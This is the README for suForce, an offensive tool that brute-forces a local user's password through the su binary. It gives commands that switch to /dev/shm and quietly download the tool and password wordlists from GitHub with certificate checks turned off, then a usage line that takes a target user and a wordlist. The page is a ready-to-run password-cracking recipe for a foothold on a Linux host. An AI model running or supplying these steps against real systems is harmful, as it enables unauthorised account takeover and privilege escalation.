# **suForce**

### Obtains a user's password by abusing the su binary.

![](/img/img.png)

---

## Download suForce

```sh
cd /dev/shm
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
chmod +x suForce
```

## Download Wordlist (Optional)

```sh
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/techyou.txt"
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/top12000.txt"
```

## Usage

```sh
./suForce -u <USER> -w <WORDLIST>
```

---
